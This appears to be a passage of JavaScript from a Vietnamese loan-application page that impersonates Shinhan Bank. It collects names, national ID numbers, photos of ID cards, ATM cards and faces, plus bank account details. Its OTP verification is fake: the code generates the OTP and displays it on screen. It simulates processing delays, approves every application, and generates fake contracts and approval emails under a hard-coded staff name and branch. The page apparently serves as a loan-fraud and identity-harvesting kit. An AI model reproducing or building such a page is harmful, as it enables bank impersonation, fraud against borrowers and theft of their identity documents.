                } else {
                    $('#contractImagePreview').html('<p>Hình ảnh hợp đồng: Chưa có</p>');
                }
            } catch (error) {
                console.error("Lỗi cập nhật preview section:", error);
                $('#profileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
                $('#contractImagePreview').html('<p>Hình ảnh hợp đồng: Chưa có</p>');
                $('#step7ProfileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
            }
        }

        function proceedToStep(currentStep, nextStep, progress) {
            try {
                console.log(`Chuyển từ bước ${currentStep} sang ${nextStep}`);
                const $current = $(`#step${currentStep}`);
                const $next = $(`#step${nextStep}`);
                $current.css({ opacity: 0, transform: 'translateY(20px)' });
                setTimeout(() => {
                    $current.addClass('hidden');
                    $next.removeClass('hidden').css({ opacity: 0, transform: 'translateY(20px)' });
                    setTimeout(() => {
                        $next.css({ opacity: 1, transform: 'translateY(0)' });
                    }, 50);
                }, 300);
                $('#progressBar').css('width', `${progress}%`);
                $('#progressLabel').text(stepLabels[nextStep] || `Bước ${nextStep}/10`);
                userData.currentStep = nextStep;
                saveToLocalStorage(nextStep);
                updatePreviewSection();
                if (nextStep === 7) {
                    renderCanvas('step7DisbursementCanvas', formData.disbursementImage, userData);
                } else if (nextStep === 8) {
                    renderCanvas('contractCanvas', formData.contractImage, userData);
                } else if (nextStep === 9) {
                    renderCanvas('disbursementCanvas', formData.disbursementImage, userData);
                }
            } catch (error) {
                console.error(`Lỗi chuyển từ bước ${currentStep} sang ${nextStep}:`, error);
                showToast("Lỗi chuyển bước. Vui lòng thử lại!", false);
            }
        }

        function goBack(currentStep, prevStep, progress) {
            try {
                if (confirm('Bạn có chắc muốn quay lại bước trước? Dữ liệu đã nhập sẽ được lưu.')) {
                    proceedToStep(currentStep, prevStep, progress);
                }
            } catch (error) {
                console.error(`Lỗi quay lại từ bước ${currentStep} sang ${prevStep}:`, error);
                showToast("Lỗi quay lại bước. Vui lòng thử lại!", false);
            }
        }

        function proceedToContract() {
            proceedToStep(7, 8, 80);
        }

        window.onload = function() {
            try {
                const savedData = localStorage.getItem('userData');
                if (savedData) {
                    userData = JSON.parse(savedData);
                    console.log('Current step:', userData.currentStep);
                    if (userData.isRegistered && userData.loanCode) {
                        showToast("Hồ sơ đã có trên hệ thống. Vui lòng quay lại!", false);
                        $('#registerForm button[type="submit"]').prop('disabled', true);
                        if (userData.currentStep >= 10) {
                            proceedToStep(1, 10, 100);
                        } else if (userData.currentStep) {
                            proceedToStep(1, userData.currentStep, userData.currentStep * 10);
                        }
                    } else {
                        $('#fullName').val(userData.fullName || '');
                        $('#idNumber').val(userData.idNumber || '');
                        $('#idIssueDate').val(userData.idIssueDate || '');
                        $('#idIssuePlace').val(userData.idIssuePlace || '');
                        $('#address').val(userData.address || '');
                        $('#occupation').val(userData.occupation || '');
                        $('#income').val(userData.income ? Number(userData.income).toLocaleString('vi-VN') : '');
                        $('#phoneNumber').val(userData.phoneNumber || '');
                        $('#email').val(userData.email || '');
                        $('#loanAmount').val(userData.loanAmount ? Number(userData.loanAmount).toLocaleString('vi-VN') : '');
                        $('#loanTerm').val(userData.loanTerm || '');
                        $('#loanPurpose').val(userData.loanPurpose || '');
                        $('#accountNumber').val(userData.accountNumber || '');
                        $('#bankName').val(userData.bankName || '');
                        $('#termsAgree').prop('checked', userData.termsAgree || false);
                        if (userData.currentStep) {
                            proceedToStep(1, userData.currentStep, userData.currentStep * 10);
                        }
                    }
                    updatePreviewSection();
                }
                // Khởi tạo tooltip
                $('[data-bs-toggle="tooltip"]').tooltip();
                // Khởi tạo input mask
                $('#phoneNumber').mask('0000000000');
                $('#accountNumber').mask('0000000000000000');
            } catch (error) {
                console.error("Lỗi khôi phục localStorage:", error);
                showToast("Không thể khôi phục dữ liệu. Vui lòng bắt đầu lại.", false);
                userData = {};
                saveToLocalStorage(1);
                updatePreviewSection();
            }
        };

        function sanitizeInput(value) {
            if (!value) return "Không Cung Cấp";
            return String(value)
                .normalize("NFD")
                .replace(/[\u0300-\u036f]/g, "")
                .replace(/[^a-zA-Z0-9_]/g, "_")
                .replace(/\s+/g, "_");
        }

        function formatNumber(number) {
            if (!number || isNaN(number)) return "0";
            return parseInt(number).toLocaleString('vi-VN');
        }

        function generateContractId() {
            try {
                const date = new Date();
                const randomNum = Math.floor(100000 + Math.random() * 900000);
                return `SHB-${date.getFullYear()}${(date.getMonth() + 1).toString().padStart(2, '0')}${date.getDate().toString().padStart(2, '0')}-${randomNum}`;
            } catch (error) {
                console.error("Lỗi tạo mã hợp đồng:", error);
                return "SHB-DEFAULT-000000";
            }
        }

        function generateRandomCode() {
            try {
                return Math.floor(100000 + Math.random() * 900000).toString();
            } catch (error) {
                console.error("Lỗi tạo mã ngẫu nhiên:", error);
                return "000000";
            }
        }

        function getCurrentDate() {
            try {
                const date = new Date();
                return `${date.getDate().toString().padStart(2, '0')}/${(date.getMonth() + 1).toString().padStart(2, '0')}/${date.getFullYear()}`;
            } catch (error) {
                console.error("Lỗi lấy ngày hiện tại:", error);
                return "01/01/2025";
            }
        }

        function calculateInterestRate(loanAmount) {
            try {
                const amount = parseInt(loanAmount);
                if (amount <= 50000000) return "12%";
                if (amount <= 200000000) return "11%";
                return "10%";
            } catch (error) {
                console.error("Lỗi tính lãi suất:", error);
                return "12%";
            }
        }

        function calculateMonthlyPayment(loanAmount, loanTerm) {
            try {
                const monthlyInterestRate = 0.01;
                const totalInterest = loanAmount * monthlyInterestRate * loanTerm;
                const totalAmount = parseInt(loanAmount) + totalInterest;
                const monthlyPayment = totalAmount / loanTerm;
                return Math.round(monthlyPayment).toLocaleString('vi-VN');
            } catch (error) {
                console.error("Lỗi tính toán khoản góp:", error);
                return "0";
            }
        }

        async function validateImage(file, inputId) {
            try {
                const maxSize = 5 * 1024 * 1024; // 5MB
                const minResolution = 300; // 300x300px
                const allowedTypes = ['image/jpeg', 'image/png'];
                if (!file) {
                    $(`#${inputId}`).addClass('is-invalid');
                    showToast("Vui lòng tải lên tệp ảnh!", false);
                    return false;
                }
                if (!allowedTypes.includes(file.type)) {
                    $(`#${inputId}`).addClass('is-invalid');
                    showToast("Vui lòng tải lên tệp JPEG hoặc PNG!", false);
                    return false;
                }
                if (file.size > maxSize) {
                    $(`#${inputId}`).addClass('is-invalid');
                    showToast("Tệp ảnh không được vượt quá 5MB!", false);
                    return false;
                }
                // Kiểm tra độ phân giải
                const img = new Image();
                const resolutionCheck = new Promise((resolve) => {
                    img.onload = () => {
                        if (img.width < minResolution || img.height < minResolution) {
                            $(`#${inputId}`).addClass('is-invalid');
                            showToast(`Ảnh phải có độ phân giải tối thiểu ${minResolution}x${minResolution}px!`, false);
                            resolve(false);
                        } else {
                            resolve(true);
                        }
                    };
                    img.src = URL.createObjectURL(file);
                });
                return await resolutionCheck;
            } catch (error) {
                console.error("Lỗi validate ảnh:", error);
                showToast("Lỗi kiểm tra ảnh. Vui lòng thử lại!", false);
                return false;
            }
        }

        async function compressImage(file) {
            try {
                const maxSize = 2 * 1024 * 1024; // 2MB
                if (file.size <= maxSize) return file;
                const img = new Image();
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const compressed = await new Promise((resolve) => {
                    img.onload = () => {
                        canvas.width = img.width;
                        canvas.height = img.height;
                        ctx.drawImage(img, 0, 0);
                        canvas.toBlob((blob) => {
                            resolve(new File([blob], file.name, { type: 'image/jpeg', lastModified: Date.now() }));
                        }, 'image/jpeg', 0.9);
                    };
                    img.src = URL.createObjectURL(file);
                });
                return compressed;
            } catch (error) {
                console.error("Lỗi nén ảnh:", error);
                return file;
            }
        }

        $('#idFrontImage').on('change', async function(e) {
            try {
                const file = e.target.files[0];
                if (file && await validateImage(file, 'idFrontImage')) {
                    const compressedFile = await compressImage(file);
                    $('#idFrontInfo').text(`${compressedFile.name} (${Math.round(compressedFile.size / 1024)} KB)`);
                }
            } catch (error) {
                console.error("Lỗi xử lý idFrontImage:", error);
                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
            }
        });

        $('#idBackImage').on('change', async function(e) {
            try {
                const file = e.target.files[0];
                if (file && await validateImage(file, 'idBackImage')) {
                    const compressedFile = await compressImage(file);
                    $('#idBackInfo').text(`${compressedFile.name} (${Math.round(compressedFile.size / 1024)} KB)`);
                }
            } catch (error) {
                console.error("Lỗi xử lý idBackImage:", error);
                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
            }
        });

        $('#atmImage').on('change', async function(e) {
            try {
                const file = e.target.files[0];
                if (file && await validateImage(file, 'atmImage')) {
                    const compressedFile = await compressImage(file);
                    $('#atmImageInfo').text(`${compressedFile.name} (${Math.round(compressedFile.size / 1024)} KB)`);
                }
            } catch (error) {
                console.error("Lỗi xử lý atmImage:", error);
                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
            }
        });

        $('#faceImage').on('change', async function(e) {
            try {
                const file = e.target.files[0];
                if (file && await validateImage(file, 'faceImage')) {
                    const compressedFile = await compressImage(file);
                    $('#faceImageInfo').text(`${compressedFile.name} (${Math.round(compressedFile.size / 1024)} KB)`);
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        userData.faceImageUrl = e.target.result;
                        updatePreviewSection();
                        saveToLocalStorage(userData.currentStep || 4);
                    };
                    reader.readAsDataURL(compressedFile);
                }
            } catch (error) {
                console.error("Lỗi xử lý faceImage:", error);
                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
            }
        });

        function generateLoanCode() {
            try {
                const date = new Date();
                const year = date.getFullYear();
                const month = String(date.getMonth() + 1).padStart(2, '0');
                const day = String(date.getDate()).padStart(2, '0');
                const random = Math.floor(100000 + Math.random() * 900000);
                return `SHB-${year}${month}${day}-${random}`;
            } catch (error) {
                console.error("Lỗi tạo mã hồ sơ:", error);
                return "SHB-DEFAULT-000000";
            }
        }

        $('#income, #loanAmount').on('input', function() {
            try {
                let value = $(this).val().replace(/[^0-9]/g, '');
                if (value) {
                    value = parseInt(value).toLocaleString('vi-VN');
                    $(this).val(value);
                }
            } catch (error) {
                console.error("Lỗi format số:", error);
            }
        });

        $('#registerForm').on('submit', async function(e) {
            try {
                e.preventDefault();
                const $submitBtn = $(this).find('button[type="submit"]');
                $submitBtn.addClass('loading').prop('disabled', true);
                if (!$('#termsAgree').is(':checked')) {
                    showToast("Vui lòng đồng ý với các điều khoản và điều kiện!", false);
                    $submitBtn.removeClass('loading').prop('disabled', false);
                    return;
                }
                if (!this.checkValidity()) {
                    const invalidFields = $(this).find(':invalid');
                    let errorMessage = "Vui lòng điền đầy đủ thông tin: ";
                    invalidFields.each(function() {
                        const label = $(this).siblings('label').text() || $(this).attr('id');
                        errorMessage += `${label}, `;
                    });
                    showToast(errorMessage.slice(0, -2), false);
                    $(this).addClass('was-validated');
                    $submitBtn.removeClass('loading').prop('disabled', false);
                    return;
                }
                let income = $('#income').val().replace(/[^0-9]/g, '') || '0';
                let loanAmount = $('#loanAmount').val().replace(/[^0-9]/g, '') || '0';
                if (parseInt(income) < 8000000) {
                    showToast("Thu nhập tối thiểu phải là 8,000,000 VND!", false);
                    $('#income').addClass('is-invalid');
                    $submitBtn.removeClass('loading').prop('disabled', false);
                    return;
                }
                if (parseInt(loanAmount) < 10000000) {
                    showToast("Số tiền vay tối thiểu phải là 10,000,000 VND!", false);
                    $('#loanAmount').addClass('is-invalid');
                    $submitBtn.removeClass('loading').prop('disabled', false);
                    return;
                }
                userData = {
                    fullName: $('#fullName').val(),
                    idNumber: $('#idNumber').val(),
                    idIssueDate: $('#idIssueDate').val() || 'Không Cung Cấp',
                    idIssuePlace: $('#idIssuePlace').val() || 'Không Cung Cấp',
                    address: $('#address').val(),
                    occupation: $('#occupation').val(),
                    income: income,
                    phoneNumber: $('#phoneNumber').val(),
                    email: $('#email').val(),
                    loanAmount: loanAmount,
                    loanTerm: $('#loanTerm').val(),
                    loanPurpose: $('#loanPurpose').val(),
                    accountNumber: $('#accountNumber').val(),
                    bankName: $('#bankName').val(),
                    termsAgree: $('#termsAgree').is(':checked'),
                    loanCode: generateLoanCode(),
                    registrationDate: getCurrentDate(),
                    monthlyPayment: calculateMonthlyPayment(loanAmount, $('#loanTerm').val()),
                    interestRate: calculateInterestRate(loanAmount),
                    sellerCode: generateRandomCode(),
                    storeCode: generateRandomCode(),
                    staffCode: generateRandomCode(),
                    staffName: "Nguyễn Thị Mỹ Duyên",
                    branchName: "Chi nhánh Shinhanbank Đà Nẵng",
                    isRegistered: true
                };
                await new Promise(resolve => setTimeout(resolve, 500)); // Giả lập thời gian xử lý
                proceedToStep(1, 2, 20);
                $submitBtn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi bước 1:", error);
                showToast("Lỗi xử lý hồ sơ. Vui lòng thử lại!", false);
                $(this).find('button[type="submit"]').removeClass('loading').prop('disabled', false);
            }
        });

        $('#proceedToStep3Btn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const idFrontImage = $('#idFrontImage')[0].files[0];
                const idBackImage = $('#idBackImage')[0].files[0];
                if (!await validateImage(idFrontImage, 'idFrontImage') || !await validateImage(idBackImage, 'idBackImage')) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                userData.idFrontImage = await compressImage(idFrontImage);
                userData.idBackImage = await compressImage(idBackImage);
                await new Promise(resolve => setTimeout(resolve, 500));
                proceedToStep(2, 3, 30);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi bước 2:", error);
                showToast("Lỗi tải lên giấy tờ. Vui lòng thử lại!", false);
                $(this).removeClass('loading').prop('disabled', false);
            }
        });

        $('#proceedToStep4Btn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const atmImage = $('#atmImage')[0].files[0];
                if (!await validateImage(atmImage, 'atmImage')) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                userData.atmImage = await compressImage(atmImage);
                await new Promise(resolve => setTimeout(resolve, 500));
                proceedToStep(3, 4, 40);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi bước 3:", error);
                showToast("Lỗi tải lên thẻ ATM. Vui lòng thử lại!", false);
                $(this).removeClass('loading').prop('disabled', false);
            }
        });

        $('#proceedToOtpBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const faceImage = $('#faceImage')[0].files[0];
                if (!await validateImage(faceImage, 'faceImage')) {
                    $btn.removeClass('loading').prop('disabled', false);
                    return;
                }
                userData.faceImage = await compressImage(faceImage);
                const otp = Math.floor(100000 + Math.random() * 900000);
                $('#otpDisplay').text(otp);
                userData.otp = otp.toString();
                saveToLocalStorage(5);
                await new Promise(resolve => setTimeout(resolve, 500));
                proceedToStep(4, 5, 50);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi bước 4:", error);
                showToast("Lỗi xử lý ảnh khuôn mặt. Vui lòng thử lại!", false);
                $(this).removeClass('loading').prop('disabled', false);
            }
        });

        function copyOtp() {
            try {
                const otp = $('#otpDisplay').text();
                navigator.clipboard.writeText(otp).then(() => {
                    showToast("Đã sao chép mã OTP!", true);
                }).catch(() => {
                    showToast("Lỗi khi sao chép mã OTP!", false);
                });
            } catch (error) {
                console.error("Lỗi sao chép OTP:", error);
                showToast("Lỗi khi sao chép mã OTP!", false);
            }
        }

        function copySignOtp() {
            try {
                const otp = $('#signOtpDisplay').text();
                navigator.clipboard.writeText(otp).then(() => {
                    showToast("Đã sao chép mã OTP!", true);
                }).catch(() => {
                    showToast("Lỗi khi sao chép mã OTP!", false);
                });
            } catch (error) {
                console.error("Lỗi sao chép OTP ký hợp đồng:", error);
                showToast("Lỗi khi sao chép mã OTP!", false);
            }
        }

        async function sendEmail(serviceId, templateId, params, maxRetries = 3) {
            try {
                for (let attempt = 1; attempt <= maxRetries; attempt++) {
                    try {
                        const response = await emailjs.send(serviceId, templateId, params);
                        showToast("Email đã được gửi!", true);
                        return response;
                    } catch (error) {
                        console.error(`Lỗi gửi email (lần ${attempt}):`, error);
                        if (attempt === maxRetries) {
                            showToast("Không thể gửi email. Vui lòng liên hệ hỗ trợ!", false);
                            return null;
                        }
                        await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                    }
                }
            } catch (error) {
                console.error("Lỗi gửi email:", error);
                showToast("Lỗi gửi email. Vui lòng thử lại!", false);
                return null;
            }
        }

        $('#verifyOtpBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const enteredOtp = $('#otp1').val() + $('#otp2').val() + $('#otp3').val() + $('#otp4').val() + $('#otp5').val() + $('#otp6').val();
                if (enteredOtp === userData.otp) {
                    showToast("Xác nhận OTP thành công!", true);
                    const emailParams = {
                        to_email: userData.email,
                        full_name: userData.fullName,
                        loan_amount: formatNumber(userData.loanAmount) + ' VND',
                        loan_code: userData.loanCode,
                        registration_date: userData.registrationDate,
                        monthly_payment: userData.monthlyPayment,
                        interest_rate: userData.interestRate,
                        loan_term: userData.loanTerm + ' tháng',
                        loan_purpose: userData.loanPurpose
                    };
                    await sendEmail('service_loan', 'template_approval', emailParams);
                    $('#confirmationMessage').text(`Mã hồ sơ: ${userData.loanCode} - Số tiền được duyệt: ${formatNumber(userData.loanAmount)} VND`);
                    $('#confirmationEmail').text(userData.email);
                    $('#modalFullName').text(`Họ và tên: ${userData.fullName}`);
                    $('#modalLoanAmount').text(`Số tiền vay: ${formatNumber(userData.loanAmount)} VND`);
                    $('#modalLoanCode').text(`Mã hồ sơ: ${userData.loanCode}`);
                    const successModal = new bootstrap.Modal(document.getElementById('successModal'));
                    successModal.show();
                } else {
                    showToast("Mã OTP không đúng!", false);
                }
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xác nhận OTP:", error);
                showToast("Lỗi xác nhận OTP. Vui lòng thử lại!", false);
                $(this).removeClass('loading').prop('disabled', false);
            }
        });

        function renderCanvas(canvasId, imageUrl, userData) {
            try {
                const canvas = document.getElementById(canvasId);
                canvas.classList.add('loading');
                const ctx = canvas.getContext('2d');
                const img = new Image();
                img.crossOrigin = "Anonymous";
                img.src = imageUrl;

                img.onload = function() {
                    const scale = Math.max(window.devicePixelRatio ||1, 2);
                    canvas.width = img.width * scale;
                    canvas.height = img.height * scale;
                    ctx.imageSmoothingEnabled = true; // Bật smoothing cho ảnh
                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);

                    // Vẽ text với độ nét cao
                    ctx.imageSmoothingEnabled = false; // Tắt smoothing cho text
                    ctx.font = `${24 * scale}px Roboto`;
                    ctx.fillStyle = '#000000';
                    ctx.textAlign = 'left';

                    // Thông tin hiển thị trên canvas (tùy thuộc vào bước)
                    const info = [
                        `Họ và Tên: ${userData.fullName || 'Không Cung Cấp'}`,
                        `Số CMND/CCCD: ${userData.idNumber || 'Không Cung Cấp'}`,
                        `Số Tiền Vay: ${formatNumber(userData.loanAmount)} VND`,
                        `Kỳ Hạn Vay: ${userData.loanTerm || 'Không Cung Cấp'} tháng`,
                        `Mã Hồ Sơ: ${userData.loanCode || 'Không Cung Cấp'}`,
                        `Ngày Đăng Ký: ${userData.registrationDate || 'Không Cung Cấp'}`
                    ];

                    info.forEach((text, index) => {
                        ctx.fillText(text, 50 * scale, (100 + index * 40) * scale);
                    });

                    // Lưu canvas dưới dạng ảnh chất lượng cao
                    if (canvasId === 'contractCanvas') {
                        userData.contractImageUrl = canvas.toDataURL('image/jpeg', 0.9);
                    }
                    saveToLocalStorage(userData.currentStep);
                    canvas.classList.remove('loading');
                };

                img.onerror = function() {
                    console.error(`Lỗi tải ảnh ${imageUrl}`);
                    showToast("Lỗi tải ảnh tài liệu. Sử dụng ảnh mặc định!", false);
                    img.src = formData.fallbackImage;
                };
            } catch (error) {
                console.error(`Lỗi render canvas ${canvasId}:`, error);
                showToast("Lỗi hiển thị tài liệu. Vui lòng thử lại!", false);
                document.getElementById(canvasId).classList.remove('loading');
            }
        }

        $('#proceedToContractBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                await new Promise(resolve => setTimeout(resolve, 500));
                proceedToStep(7, 8, 70);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi bước 7:", error);
                showToast("Lỗi xem hợp đồng. Vui lòng thử lại!", false);
                $(this).removeClass('loading').prop('disabled', false);
            }
        });

        $('#proceedToSignContractBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const signOtp = Math.floor(100000 + Math.random() * 900000);
                $('#signOtpDisplay').text(signOtp);
                userData.signOtp = signOtp.toString();
                saveToLocalStorage(8);
                await new Promise(resolve => setTimeout(resolve, 500));
                proceedToStep(8, '8-1', 80);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi bước 8:", error);
                showToast("Lỗi xử lý hợp đồng. Vui lòng thử lại!", false);
                $(this).removeClass('loading').prop('disabled', false);
            }
        });

        $('#verifySignOtpBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const enteredSignOtp = $('#signOtp1').val() + $('#signOtp2').val() + $('#signOtp3').val() + $('#signOtp4').val() + $('#signOtp5').val() + $('#signOtp6').val();
                if (enteredSignOtp === userData.signOtp) {
                    showToast("Xác nhận ký hợp đồng thành công!", true);
                    const emailParams = {
                        to_email: userData.email,
                        full_name: userData.fullName,
                        loan_amount: formatNumber(userData.loanAmount) + ' VND',
                        loan_code: userData.loanCode,
                        registration_date: userData.registrationDate,
                        monthly_payment: userData.monthlyPayment,
                        interest_rate: userData.interestRate,
                        loan_term: userData.loanTerm + ' tháng',
                        loan_purpose: userData.loanPurpose
                    };
                    await sendEmail('service_loan', 'template_contract', emailParams);
                    await new Promise(resolve => setTimeout(resolve, 500));
                    proceedToStep('8-1', 9, 90);
                } else {
                    showToast("Mã OTP không đúng!", false);
                }
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi xác nhận OTP ký hợp đồng:", error);
                showToast("Lỗi xác nhận OTP. Vui lòng thử lại!", false);
                $(this).removeClass('loading').prop('disabled', false);
            }
        });

        $('#proceedToFinalStepBtn').on('click', async function() {
            try {
                const $btn = $(this);
                $btn.addClass('loading').prop('disabled', true);
                const emailParams = {
                    to_email: userData.email,
                    full_name: userData.fullName,
                    loan_amount: formatNumber(userData.loanAmount) + ' VND',
                    loan_code: userData.loanCode,
                    registration_date: userData.registrationDate,
                    monthly_payment: userData.monthlyPayment,
                    interest_rate: userData.interestRate,
                    loan_term: userData.loanTerm + ' tháng',
                    loan_purpose: userData.loanPurpose
                };
                await sendEmail('service_loan', 'template_completion', emailParams);
                await new Promise(resolve => setTimeout(resolve, 500));
                proceedToStep(9, 10, 100);
                $btn.removeClass('loading').prop('disabled', false);
            } catch (error) {
                console.error("Lỗi bước 9:", error);
                showToast("Lỗi hoàn tất đăng ký. Vui lòng thử lại!", false);
                $(this).removeClass('loading').prop('disabled', false);
            }
        });

        // Xử lý nhập OTP
        $('.otp-digit').on('input', function() {
            try {
                if (this.value.length === 1) {
                    const nextInput = $(this).next('.otp-digit');
                    if (nextInput.length) {
                        nextInput.focus();
                    }
                }
            } catch (error) {
                console.error("Lỗi xử lý OTP input:", error);
            }
        });

        $('.otp-digit').on('keydown', function(e) {
            try {
                if (e.key === 'Backspace' && !this.value) {
                    const prevInput = $(this).prev('.otp-digit');
                    if (prevInput.length) {
                        prevInput.focus();
                    }
                }
            } catch (error) {
                console.error("Lỗi xử lý OTP backspace:", error);
            }
        });
    </script>
</body>
</html>
